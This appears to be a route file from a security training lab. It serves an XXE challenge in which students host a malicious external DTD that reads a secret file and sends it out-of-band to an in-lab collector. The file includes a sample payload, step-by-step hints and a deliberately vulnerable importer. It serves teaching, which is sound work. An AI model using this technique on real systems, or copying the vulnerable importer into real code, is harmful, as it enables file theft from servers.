'use strict';
// External DTD exfiltration: the dtd endpoint honors an external DTD pulled in
// through a parameter entity and expands parameter entities declared inside
// that DTD, so a hosted DTD can read the module secret and make the server
// exfiltrate it out-of-band to the OOB collector.
const express = require('express');
const { page, esc, brief, hintBox, flagBox, fixPanel } = require('../../../lib/page');
const { award } = require('../../../lib/flags');
// Module-level state and helpers live in modules/xxe/shared.js (created by the
// finisher): oobLog is the shared OOB pingback log (same array identity used
// by the collector routes), SECRET_ABS points at modules/xxe/secret.txt, and
// expandExternalDtd is the external-DTD expander from router.js. The collector
// routes (/xxe/collector, /xxe/collector/log, /xxe/collector/dtd) must also be
// wired by the finisher; this file only links to them.
const { expandExternalDtd, SECRET_ABS, oobProven, claimPingbacks, countUniquePingbacks } = require('../shared');

const router = express.Router();

// GET /xxe/dtd -> the external DTD challenge form.
router.get('/dtd', (req, res) => {
  const base = `http://${req.get('host')}`;
  // Per-session DTD slot (P1-1): the sample points at this session's own
  // hosted-DTD URL, shown on the collector page.
  const sample = `<!DOCTYPE r [\n<!ENTITY % dtd SYSTEM "${base}/xxe/collector/dtd/${req.sessionID}">\n%dtd;\n]>\n<data>&pingback;</data>`;
  res.send(page('External DTD', `
    <h2>External DTD exfiltration</h2>
    ${brief('Challenge', `
      <p>This endpoint honors an <b>external DTD</b> pulled in through a parameter entity,
      and expands parameter entities declared <b>inside</b> that DTD. Your DTD can read a
      local file into <code>%file;</code> and then make the server request a URL with the
      file content in it.</p>
      <p><b>Plan:</b> 1) host your malicious DTD on the <a href="/xxe/collector">OOB collector</a>,
      2) submit the XML below so the server fetches your DTD, 3) watch the pingback land in
      the collector log with the secret in it.</p>`)}
    <form class="clay-card" method="POST" action="/xxe/dtd">
      <div class="clay-field">
        <label for="xxe-dtd-xml">XML payload</label>
        <textarea class="clay-input" id="xxe-dtd-xml" name="xml" rows="10">${esc(sample)}</textarea>
      </div>
      <button class="clay-btn clay-btn-primary" type="submit">Import XML</button>
    </form>
    ${hintBox('Your DTD needs two declarations working together: one that reads a local file into a parameter entity, and one that makes the server request the collector URL with that content in it. The collector page explains the two jobs your DTD has to do.')}
  `));
});

// POST /xxe/dtd -> expand the external DTD, award only when this request's
// own entity expansion read the secret from disk and pinged it back to the
// collector. The shared collector log plays no part in the award, so a
// direct ping of the log, or another student's exfiltration, earns nothing.
// VULN: the importer loads an attacker-supplied external DTD, so parameter
// entities can read local files and exfiltrate them to a collector URL.
router.post('/dtd', async (req, res) => {
  const xml = String(req.body.xml || '').slice(0, 20000);
  const trace = { fetches: [], reads: [], selfBase: `http://${req.get('host')}`, cookie: req.headers.cookie || '' };
  const expanded = await expandExternalDtd(xml, trace);
  claimPingbacks(req.sessionID, trace);
  const pingbacks = countUniquePingbacks(trace);
  let flags = '';
  if (oobProven(xml, trace, 'XXE-SECRET-4471')) {
    flags += flagBox(award(req, 'xxe', 'xxe-external-dtd'));
    flags += fixPanel('xxe', 'xxe-external-dtd');
  }
  const dataMatch = expanded.match(/<data[^>]*>([\s\S]*?)<\/data>/i);
  const shown = dataMatch ? dataMatch[1] : expanded;
  res.send(page('External DTD', `
    <h2>Import result</h2>
    ${flags}
    <div class="clay-card">
      <p>Pingbacks to the collector fired by this request: <b>${pingbacks}</b>.
      (<a href="/xxe/collector">view the collector log</a>)</p>
      <h3>Parsed content</h3>
      <pre>${esc(shown.slice(0, 2000))}</pre>
    </div>
    <p><a class="clay-btn clay-btn-secondary clay-btn-sm" href="/xxe/dtd">&larr; Try again</a>
    <a class="clay-btn clay-btn-secondary clay-btn-sm" href="/xxe">Back to module</a></p>
  `));
});

module.exports = {
  vuln: {
    id: 'xxe-external-dtd',
    name: 'External DTD Exfiltration',
    difficulty: 'Medium',
    est: 'about 25 minutes',
    hint: 'Host a malicious DTD on the in-lab OOB collector, pull it in with a parameter entity, and make the DTD ping the collector back with the file content in the URL.',
    hints: ["The DTD doesn't have to be inline. Browse to /xxe/collector through Burp Proxy and use the host-a-DTD form to serve one from the lab itself.", "In your import XML, point the DOCTYPE's external subset at http://HOST/xxe/collector/dtd through a parameter entity. The parser fetches it server-side, and anything declared there runs with the same privileges as inline entities.", "Your hosted DTD can read the secret file into a parameter entity and declare a pingback entity that points at /xxe/collector/log?d=%file;. Send the import XML from Burp Repeater, then reload the collector log to watch the exfil land."],
    tools: "BZ",
    how: 'External DTDs are fetched server-side and trusted. Host one on the in-lab collector and make the import pull it in, then watch the pingbacks land.',
    link: '/xxe#xxe-external-dtd',
    start: 'In Burp Proxy, open /xxe/collector and use the host-a-DTD form; then send POST /xxe/dtd from Repeater with XML that imports http://HOST/xxe/collector/dtd via a parameter entity, and confirm the pingback in the collector log.',
  },
  router,
};
